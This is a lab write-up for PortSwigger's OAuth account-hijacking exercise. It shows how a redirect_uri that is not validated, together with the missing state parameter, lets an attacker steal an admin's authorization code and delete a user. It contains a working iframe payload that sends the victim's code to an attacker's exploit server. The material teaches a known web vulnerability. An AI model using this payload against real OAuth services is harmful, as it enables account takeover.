# OAuth account hijacking via redirect_uri

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri), you'll learn: OAuth account hijacking via redirect_uri! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab uses an [OAuth](https://portswigger.net/web-security/oauth) service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.

To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete Carlos.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in with your own social media account using the following credentials: `wiener:peter`.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-3/images/Pasted%20image%2020230107022614.png)

Let's try to login by clicking the "My account" link:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-3/images/Pasted%20image%2020230107022645.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-3/images/Pasted%20image%2020230107022657.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-3/images/Pasted%20image%2020230107022703.png)

When we redirected to `/social-login`, it'll send a GET request to `/auth`, with parameters:

- `client_id`: `m2jcb3vfzwnsy33idi19v`
- `redirect_uri`: `https://0a83006b04184d3dc0c10e90002a0095.web-security-academy.net/oauth-callback`
- `response_type`: `code`
- `scope`: `openid profile email`

In the above `response_type`, it's set to `code`, which tells us **the OAuth grant type is authorization code.**

Also, it's missing the `state` parameter, which helps to prevent CSRF (Cross-Site Request Forgery) attack.

Let's finish the OAuth flow:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-3/images/Pasted%20image%2020230107023003.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-3/images/Pasted%20image%2020230107023016.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-3/images/Pasted%20image%2020230107023034.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-3/images/Pasted%20image%2020230107023510.png)

Armed with above information, we can try to modify the `redirect_uri` to our exploit server access log via Burp Suite. So we can steal victim's `code` parameter value, and hijack victim's session.

Let's test it:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-3/images/Pasted%20image%2020230107023810.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-3/images/Pasted%20image%2020230107023829.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-3/images/Pasted%20image%2020230107023851.png)

It worked!

**Now, we can craft a CSRF payload to steal victim's `code` parameter value:**
```html
<html>
    <head>
        <title>OAuth-3</title>
    </head>
    <body>
        <iframe src="https://oauth-0add009804b34dc2c02b0cae022a0026.web-security-academy.net/auth?client_id=m2jcb3vfzwnsy33idi19v&redirect_uri=https://exploit-0a6700f904744d64c0cf0d3a019c0009.exploit-server.net/log&response_type=code&scope=openid%20profile%20email"></iframe>
    </body>
</html>
```

> Note: The OAuth service provider is in a different subdomain.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-3/images/Pasted%20image%2020230107030333.png)

Exploit server access log:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-3/images/Pasted%20image%2020230107030358.png)

Nice! We got it!

**Now, we can send a GET request to `/oauth-callback?code=WbhQtp-Zy9tGAIZQ2GViRUn5RJeeEGXE6GbukOWm_u3`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-3/images/Pasted%20image%2020230107030456.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-3/images/Pasted%20image%2020230107030504.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-3/images/Pasted%20image%2020230107030511.png)

I'm user administrator!

Let's go to the admin panel and deleter user `carlos`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-3/images/Pasted%20image%2020230107030536.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-3/images/Pasted%20image%2020230107030543.png)

# What we've learned:

1. OAuth account hijacking via redirect_uri